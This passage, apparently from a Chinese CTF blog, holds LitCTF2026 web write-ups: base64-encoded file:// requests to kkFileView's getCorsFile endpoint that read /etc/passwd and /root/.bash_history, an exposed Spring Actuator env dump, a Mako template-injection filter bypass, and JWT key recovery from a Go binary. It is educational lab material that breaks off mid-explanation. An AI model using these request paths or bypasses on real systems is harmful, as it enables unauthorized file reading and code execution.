class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>这个是为后面铺垫的，只是为了证明这个绕过有效。</p>
+<p>虽然首页里提到了 <code>finance_2026q1.xlsx</code>，但直接去猜缓存中文件名不一定好猜。</p>
+<p>既然是缓存文件，就试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///root/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>它的 Base64 为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmlsZTovLy9yb290Ly5iYXNoX2hpc3Rvcnk=</span><br></pre></td></tr></table></figure>
+
+<p>就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/kkfileview/getCorsFile?urlPath=ZmlsZTovLy9yb290Ly5iYXNoX2hpc3Rvcnk=</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/kkfileview/bin</span><br><span class="line">./startup.sh --cache.dir=/opt/kkfileview/cache/parsed</span><br><span class="line">java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true</span><br><span class="line">cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip</span><br></pre></td></tr></table></figure>
+
+<p>前面那些路径说实话猜出来的路径，只不过比较常见，也是试出来可读罢了。</p>
+<p>好的，这个暴露出来：我们要找的财务归档文件是 <code>q1_finance_report_2026.zip</code></p>
+<p>它就放在 <code>/opt/kkfileview/cache/parsed/</code> 。</p>
+<p>继续：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///opt/kkfileview/cache/parsed/q1_finance_report_2026.zip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmlsZTovLy9vcHQva2tmaWxldmlldy9jYWNoZS9wYXJzZWQvcTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getCorsFile?urlPath=ZmlsZTovLy9vcHQva2tmaWxldmlldy9jYWNoZS9wYXJzZWQvcTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=</span><br></pre></td></tr></table></figure>
+
+<p>拿到一个压缩包，拿到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523150658691.png" alt="image-20260523150658691"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3tfvqu1p-ibun-4nk-8rne-s1oj1khtnvt0g&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-华辰企业服务运营平台"><a href="#LitCTF2026-华辰企业服务运营平台" class="headerlink" title="[LitCTF2026] 华辰企业服务运营平台"></a>[LitCTF2026] 华辰企业服务运营平台</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">某客服工单系统上线后，保留了大量运维与调试能力。</span><br><span class="line">你需要从系统暴露面和服务器中收集关键信息，完成权限突破并还原完整 flag</span><br></pre></td></tr></table></figure>
+
+<p>先全部点一下，登录和工作台跳到的都是登录界面</p>
+<p>dirsearch扫一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523154057019.png" alt="image-20260523154057019"></p>
+<p>访问：&#x2F;actuator</p>
+<p>返回一堆json:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;beans&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/beans&quot;,&quot;templated&quot;:false&#125;,&quot;caches&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/caches&quot;,&quot;templated&quot;:false&#125;,&quot;caches-cache&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/caches/&#123;cache&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;health&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/health&quot;,&quot;templated&quot;:false&#125;,&quot;health-path&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/health/&#123;*path&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;info&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/info&quot;,&quot;templated&quot;:false&#125;,&quot;conditions&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/conditions&quot;,&quot;templated&quot;:false&#125;,&quot;configprops&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/configprops&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;loggers&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/loggers&quot;,&quot;templated&quot;:false&#125;,&quot;loggers-name&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/loggers/&#123;name&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;heapdump&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/heapdump&quot;,&quot;templated&quot;:false&#125;,&quot;threaddump&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/threaddump&quot;,&quot;templated&quot;:false&#125;,&quot;metrics&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/metrics&quot;,&quot;templated&quot;:false&#125;,&quot;metrics-requiredMetricName&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/metrics/&#123;requiredMetricName&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;scheduledtasks&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/scheduledtasks&quot;,&quot;templated&quot;:false&#125;,&quot;mappings&quot;:&#123;&quot;href&quot;:&quot;http://challenge.cyclens.tech:31171/actuator/mappings&quot;,&quot;templated&quot;:false&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题大概就是通过 Actuator 读取敏感配置、环境变量、路由信息，甚至进一步找出权限绕过点。</p>
+<p>访问：&#x2F;actuator&#x2F;env</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;activeProfiles&quot;:[],&quot;propertySources&quot;:[&#123;&quot;name&quot;:&quot;server.ports&quot;,&quot;properties&quot;:&#123;&quot;local.server.port&quot;:&#123;&quot;value&quot;:8080&#125;&#125;&#125;,&#123;&quot;name&quot;:&quot;servletContextInitParams&quot;,&quot;properties&quot;:&#123;&#125;&#125;,&#123;&quot;name&quot;:&quot;systemProperties&quot;,&quot;properties&quot;:&#123;&quot;java.runtime.name&quot;:&#123;&quot;value&quot;:&quot;OpenJDK Runtime Environment&quot;&#125;,&quot;java.protocol.handler.pkgs&quot;:&#123;&quot;value&quot;:&quot;org.springframework.boot.loader&quot;&#125;,&quot;sun.boot.library.path&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk/lib/amd64&quot;&#125;,&quot;java.vm.version&quot;:&#123;&quot;value&quot;:&quot;25.492-b09&quot;&#125;,&quot;java.vm.vendor&quot;:&#123;&quot;value&quot;:&quot;Temurin&quot;&#125;,&quot;java.vendor.url&quot;:&#123;&quot;value&quot;:&quot;https://adoptium.net/&quot;&#125;,&quot;path.separator&quot;:&#123;&quot;value&quot;:&quot;:&quot;&#125;,&quot;java.vm.name&quot;:&#123;&quot;value&quot;:&quot;OpenJDK 64-Bit Server VM&quot;&#125;,&quot;file.encoding.pkg&quot;:&#123;&quot;value&quot;:&quot;sun.io&quot;&#125;,&quot;user.country&quot;:&#123;&quot;value&quot;:&quot;US&quot;&#125;,&quot;sun.java.launcher&quot;:&#123;&quot;value&quot;:&quot;SUN_STANDARD&quot;&#125;,&quot;sun.os.patch.level&quot;:&#123;&quot;value&quot;:&quot;unknown&quot;&#125;,&quot;PID&quot;:&#123;&quot;value&quot;:&quot;1&quot;&#125;,&quot;java.vm.specification.name&quot;:&#123;&quot;value&quot;:&quot;Java Virtual Machine Specification&quot;&#125;,&quot;user.dir&quot;:&#123;&quot;value&quot;:&quot;/opt/app&quot;&#125;,&quot;java.runtime.version&quot;:&#123;&quot;value&quot;:&quot;1.8.0_492-b09&quot;&#125;,&quot;java.awt.graphicsenv&quot;:&#123;&quot;value&quot;:&quot;sun.awt.X11GraphicsEnvironment&quot;&#125;,&quot;java.endorsed.dirs&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk/lib/endorsed&quot;&#125;,&quot;os.arch&quot;:&#123;&quot;value&quot;:&quot;amd64&quot;&#125;,&quot;java.io.tmpdir&quot;:&#123;&quot;value&quot;:&quot;/tmp&quot;&#125;,&quot;line.separator&quot;:&#123;&quot;value&quot;:&quot;\n&quot;&#125;,&quot;java.vm.specification.vendor&quot;:&#123;&quot;value&quot;:&quot;Oracle Corporation&quot;&#125;,&quot;os.name&quot;:&#123;&quot;value&quot;:&quot;Linux&quot;&#125;,&quot;sun.jnu.encoding&quot;:&#123;&quot;value&quot;:&quot;UTF-8&quot;&#125;,&quot;spring.beaninfo.ignore&quot;:&#123;&quot;value&quot;:&quot;true&quot;&#125;,&quot;java.library.path&quot;:&#123;&quot;value&quot;:&quot;/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib&quot;&#125;,&quot;java.specification.name&quot;:&#123;&quot;value&quot;:&quot;Java Platform API Specification&quot;&#125;,&quot;java.class.version&quot;:&#123;&quot;value&quot;:&quot;52.0&quot;&#125;,&quot;sun.management.compiler&quot;:&#123;&quot;value&quot;:&quot;HotSpot 64-Bit Tiered Compilers&quot;&#125;,&quot;os.version&quot;:&#123;&quot;value&quot;:&quot;7.0.2-4-pve&quot;&#125;,&quot;user.home&quot;:&#123;&quot;value&quot;:&quot;/root&quot;&#125;,&quot;catalina.useNaming&quot;:&#123;&quot;value&quot;:&quot;false&quot;&#125;,&quot;user.timezone&quot;:&#123;&quot;value&quot;:&quot;Etc/UTC&quot;&#125;,&quot;java.awt.printerjob&quot;:&#123;&quot;value&quot;:&quot;sun.print.PSPrinterJob&quot;&#125;,&quot;file.encoding&quot;:&#123;&quot;value&quot;:&quot;UTF-8&quot;&#125;,&quot;java.specification.version&quot;:&#123;&quot;value&quot;:&quot;1.8&quot;&#125;,&quot;catalina.home&quot;:&#123;&quot;value&quot;:&quot;/tmp/tomcat.8080.8345083766926613318&quot;&#125;,&quot;java.class.path&quot;:&#123;&quot;value&quot;:&quot;/opt/app/app.jar&quot;&#125;,&quot;user.name&quot;:&#123;&quot;value&quot;:&quot;root&quot;&#125;,&quot;java.vm.specification.version&quot;:&#123;&quot;value&quot;:&quot;1.8&quot;&#125;,&quot;sun.java.command&quot;:&#123;&quot;value&quot;:&quot;******&quot;&#125;,&quot;java.home&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk&quot;&#125;,&quot;sun.arch.data.model&quot;:&#123;&quot;value&quot;:&quot;64&quot;&#125;,&quot;user.language&quot;:&#123;&quot;value&quot;:&quot;en&quot;&#125;,&quot;java.specification.vendor&quot;:&#123;&quot;value&quot;:&quot;Oracle Corporation&quot;&#125;,&quot;awt.toolkit&quot;:&#123;&quot;value&quot;:&quot;sun.awt.X11.XToolkit&quot;&#125;,&quot;java.vm.info&quot;:&#123;&quot;value&quot;:&quot;mixed mode&quot;&#125;,&quot;java.version&quot;:&#123;&quot;value&quot;:&quot;1.8.0_492&quot;&#125;,&quot;java.ext.dirs&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk/lib/ext:/usr/java/packages/lib/ext&quot;&#125;,&quot;sun.boot.class.path&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk/lib/resources.jar:/opt/java/openjdk/lib/rt.jar:/opt/java/openjdk/lib/sunrsasign.jar:/opt/java/openjdk/lib/jsse.jar:/opt/java/openjdk/lib/jce.jar:/opt/java/openjdk/lib/charsets.jar:/opt/java/openjdk/lib/jfr.jar:/opt/java/openjdk/classes&quot;&#125;,&quot;java.awt.headless&quot;:&#123;&quot;value&quot;:&quot;true&quot;&#125;,&quot;java.vendor&quot;:&#123;&quot;value&quot;:&quot;Temurin&quot;&#125;,&quot;catalina.base&quot;:&#123;&quot;value&quot;:&quot;/tmp/tomcat.8080.8345083766926613318&quot;&#125;,&quot;java.specification.maintenance.version&quot;:&#123;&quot;value&quot;:&quot;6&quot;&#125;,&quot;file.separator&quot;:&#123;&quot;value&quot;:&quot;/&quot;&#125;,&quot;java.vendor.url.bug&quot;:&#123;&quot;value&quot;:&quot;https://github.com/adoptium/adoptium-support/issues&quot;&#125;,&quot;sun.io.unicode.encoding&quot;:&#123;&quot;value&quot;:&quot;UnicodeLittle&quot;&#125;,&quot;sun.cpu.endian&quot;:&#123;&quot;value&quot;:&quot;little&quot;&#125;,&quot;sun.cpu.isalist&quot;:&#123;&quot;value&quot;:&quot;&quot;&#125;&#125;&#125;,&#123;&quot;name&quot;:&quot;systemEnvironment&quot;,&quot;properties&quot;:&#123;&quot;PATH&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;PATH\&quot;&quot;&#125;,&quot;KUBERNETES_PORT_443_TCP&quot;:&#123;&quot;value&quot;:&quot;tcp://10.43.0.1:443&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_PORT_443_TCP\&quot;&quot;&#125;,&quot;LANGUAGE&quot;:&#123;&quot;value&quot;:&quot;en_US:en&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LANGUAGE\&quot;&quot;&#125;,&quot;KUBERNETES_PORT_443_TCP_ADDR&quot;:&#123;&quot;value&quot;:&quot;10.43.0.1&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_PORT_443_TCP_ADDR\&quot;&quot;&#125;,&quot;KUBERNETES_PORT&quot;:&#123;&quot;value&quot;:&quot;tcp://10.43.0.1:443&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_PORT\&quot;&quot;&#125;,&quot;CONTAINER_ENDPOINT&quot;:&#123;&quot;value&quot;:&quot;challenge.cyclens.tech&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;CONTAINER_ENDPOINT\&quot;&quot;&#125;,&quot;LAB_FLAG_PART2&quot;:&#123;&quot;value&quot;:&quot;r-83b0-lqfywkijejctz&#125;&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LAB_FLAG_PART2\&quot;&quot;&#125;,&quot;JAVA_HOME&quot;:&#123;&quot;value&quot;:&quot;/opt/java/openjdk&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;JAVA_HOME\&quot;&quot;&#125;,&quot;KUBERNETES_PORT_443_TCP_PROTO&quot;:&#123;&quot;value&quot;:&quot;tcp&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_PORT_443_TCP_PROTO\&quot;&quot;&#125;,&quot;FLAG&quot;:&#123;&quot;value&quot;:&quot;flag&#123;cboyej4v-zaqh-4jr-83b0-lqfywkijejctz&#125;&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;FLAG\&quot;&quot;&#125;,&quot;KUBERNETES_SERVICE_HOST&quot;:&#123;&quot;value&quot;:&quot;10.43.0.1&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_SERVICE_HOST\&quot;&quot;&#125;,&quot;LANG&quot;:&#123;&quot;value&quot;:&quot;C.UTF-8&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LANG\&quot;&quot;&#125;,&quot;KUBERNETES_SERVICE_PORT&quot;:&#123;&quot;value&quot;:&quot;443&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_SERVICE_PORT\&quot;&quot;&#125;,&quot;HOSTNAME&quot;:&#123;&quot;value&quot;:&quot;ce-dv2nnp0ts2ok&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;HOSTNAME\&quot;&quot;&#125;,&quot;LC_ALL&quot;:&#123;&quot;value&quot;:&quot;en_US.UTF-8&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LC_ALL\&quot;&quot;&#125;,&quot;LAB_SHIRO_KEY_B64&quot;:&#123;&quot;value&quot;:&quot;R1pDVEZTaGlyb0dDTUtleQ==&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LAB_SHIRO_KEY_B64\&quot;&quot;&#125;,&quot;LAB_SHIRO_ALG_MODE&quot;:&#123;&quot;value&quot;:&quot;GCM&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;LAB_SHIRO_ALG_MODE\&quot;&quot;&#125;,&quot;CONTAINER_PORT&quot;:&#123;&quot;value&quot;:&quot;31171&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;CONTAINER_PORT\&quot;&quot;&#125;,&quot;KUBERNETES_PORT_443_TCP_PORT&quot;:&#123;&quot;value&quot;:&quot;443&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_PORT_443_TCP_PORT\&quot;&quot;&#125;,&quot;JAVA_VERSION&quot;:&#123;&quot;value&quot;:&quot;jdk8u492-b09&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;JAVA_VERSION\&quot;&quot;&#125;,&quot;PWD&quot;:&#123;&quot;value&quot;:&quot;/opt/app&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;PWD\&quot;&quot;&#125;,&quot;KUBERNETES_SERVICE_PORT_HTTPS&quot;:&#123;&quot;value&quot;:&quot;443&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;KUBERNETES_SERVICE_PORT_HTTPS\&quot;&quot;&#125;,&quot;SHLVL&quot;:&#123;&quot;value&quot;:&quot;0&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;SHLVL\&quot;&quot;&#125;,&quot;HOME&quot;:&#123;&quot;value&quot;:&quot;/root&quot;,&quot;origin&quot;:&quot;System Environment Property \&quot;HOME\&quot;&quot;&#125;&#125;&#125;,&#123;&quot;name&quot;:&quot;applicationConfig: [classpath:/application.yml]&quot;,&quot;properties&quot;:&#123;&quot;server.port&quot;:&#123;&quot;value&quot;:8080,&quot;origin&quot;:&quot;class path resource [application.yml]:2:9&quot;&#125;,&quot;server.servlet.session.timeout&quot;:&#123;&quot;value&quot;:&quot;30m&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:5:16&quot;&#125;,&quot;spring.application.name&quot;:&#123;&quot;value&quot;:&quot;support-center&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:9:11&quot;&#125;,&quot;spring.thymeleaf.cache&quot;:&#123;&quot;value&quot;:false,&quot;origin&quot;:&quot;class path resource [application.yml]:11:12&quot;&#125;,&quot;lab.shiro.key-b64&quot;:&#123;&quot;value&quot;:&quot;R1pDVEZTaGlyb0dDTUtleQ==&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:15:14&quot;&#125;,&quot;lab.shiro.alg-mode&quot;:&#123;&quot;value&quot;:&quot;GCM&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:16:15&quot;&#125;,&quot;lab.flag.part2&quot;:&#123;&quot;value&quot;:&quot;r-83b0-lqfywkijejctz&#125;&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:18:12&quot;&#125;,&quot;management.server.port&quot;:&#123;&quot;value&quot;:8080,&quot;origin&quot;:&quot;class path resource [application.yml]:22:11&quot;&#125;,&quot;management.endpoints.web.base-path&quot;:&#123;&quot;value&quot;:&quot;/actuator&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:25:18&quot;&#125;,&quot;management.endpoints.web.exposure.include&quot;:&#123;&quot;value&quot;:&quot;*&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:27:18&quot;&#125;,&quot;management.endpoints.web.exposure.exclude&quot;:&#123;&quot;value&quot;:&quot;gateway,shutdown&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:28:18&quot;&#125;,&quot;management.endpoint.health.show-details&quot;:&#123;&quot;value&quot;:&quot;always&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:31:21&quot;&#125;,&quot;management.endpoint.env.show-values&quot;:&#123;&quot;value&quot;:&quot;always&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:33:20&quot;&#125;,&quot;management.endpoint.configprops.show-values&quot;:&#123;&quot;value&quot;:&quot;always&quot;,&quot;origin&quot;:&quot;class path resource [application.yml]:35:20&quot;&#125;,&quot;management.endpoint.heapdump.enabled&quot;:&#123;&quot;value&quot;:true,&quot;origin&quot;:&quot;class path resource [application.yml]:37:16&quot;&#125;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好吧不扯多的了，这里面就有flag,hhh:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523154513517.png" alt="image-20260523154513517"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cboyej4v-zaqh-4jr-83b0-lqfywkijejctz&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-ezssti"><a href="#LitCTF2026-lit-ezssti" class="headerlink" title="[LitCTF2026] lit_ezssti"></a>[LitCTF2026] lit_ezssti</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缺什么补什么（x</span><br></pre></td></tr></table></figure>
+
+<p>先尝试几个常见的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523154940749.png" alt="image-20260523154940749"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523154959832.png" alt="image-20260523154959832"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155016585.png" alt="image-20260523155016585"></p>
+<p>呜呜呜不要拦我。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155047743.png" alt="image-20260523155047743"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155141142.png" alt="image-20260523155141142"></p>
+<p>嘶居然没拦。试试Mako的代码块语法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155244061.png" alt="image-20260523155244061"></p>
+<p>OK这个不拦，去读文件（中间尝试的比较多就不赘述了）:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155358242.png" alt="image-20260523155358242"></p>
+<p>flag 文件就在 &#x2F;flag，但是直接读会被拦：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155510958.png" alt="image-20260523155510958"></p>
+<p>我们采用不写 <code>popen(...).read()</code>，而是改成 <code>getattr(...,&#39;read&#39;)()</code>，绕过点号过滤,先在 <code>&lt;%! ... %&gt;</code> 里导入 <code>popen</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155627711.png" alt="image-20260523155627711"></p>
+<p>拿到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;npzfyxxr-z88c-4z1-8yi8-bs2rqdvbbidyx&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-reverse-my-web"><a href="#LitCTF2026-lit-reverse-my-web" class="headerlink" title="[LitCTF2026] lit_reverse_my_web"></a>[LitCTF2026] lit_reverse_my_web</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Web手也要会逆向么喵？</span><br></pre></td></tr></table></figure>
+
+<p>先注册登录一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523171946671.png" alt="image-20260523171946671"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523172001712.png" alt="image-20260523172001712"></p>
+<p>进去后归档中心就是&#x2F;flag路径：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523172043978.png" alt="image-20260523172043978"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523172051157.png" alt="image-20260523172051157"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523172245452.png" alt="image-20260523172245452"></p>
+<p>有jwt，康康：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523172344296.png" alt="image-20260523172344296"></p>
+<p>密钥用hashcat爆过，爆不出来，先去附件那个go文件里找点线索：</p>
+<p>因为go文件放入IDA太庞大了，用AI梭了一下。</p>
+<p>对话截图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175002248.png" alt="image-20260523175002248"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175021636.png" alt="image-20260523175021636"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175102453.png" alt="image-20260523175102453"></p>
+<p>对这个程序做最基础的字符串和符号检查，很快能看到一些非常有用的名字：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main.(*app).signJWT</span><br><span class="line">main.(*app).parseToken</span><br><span class="line">main.(*app).handleFlag</span><br><span class="line">reverseMyWeb/internal/jwtsecret.Key</span><br><span class="line">reverseMyWeb/internal/jwtsecret.encKey</span><br></pre></td></tr></table></figure>
+
+<p>这说明：</p>
+<ol>
+<li>程序没有去掉 Go 符号</li>
+<li>JWT 签发、JWT 解析、<code>/flag</code> 处理函数都能直接定位</li>
+<li>还存在一个专门放 JWT 密钥的模块 <code>jwtsecret</code></li>
+</ol>
+<p>光看这些名字，其实题目思路已经很清楚了：</p>
+<ul>
+<li><code>signJWT</code> 负责签发用户登录后的 token</li>
+<li><code>parseToken</code> 负责校验 token</li>
+<li><code>jwtsecret.encKey</code> 很可能是被“简单加密”后的签名密钥</li>
+</ul>
+<p>拿一个正常用户登录后得到的 JWT，拆出前两段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header.payload</span><br></pre></td></tr></table></figure>
+
+<p>再拿程序里后面恢复出来的密钥去本地重算 HMAC-SHA256，结果和站点发下来的签名完全一致。</p>
+<p>这一步说明：</p>
+<ol>
+<li>签名算法就是普通的 <code>HS256</code></li>
+<li>只要能恢复出密钥，就能百分百伪造管理员 token</li>
+</ol>
+<p>定位 <code>encKey</code>，发现它是一个 32 字节密钥材料</p>
+<p>运行时读内存或者静态读全局变量都能看到：<code>reverseMyWeb/internal/jwtsecret.encKey</code> 对应的是一段长度为 <code>0x20</code> 的字节数组，也就是 32 字节。</p>
+<p>其中真正关键的 32 字节内容如下：</p>
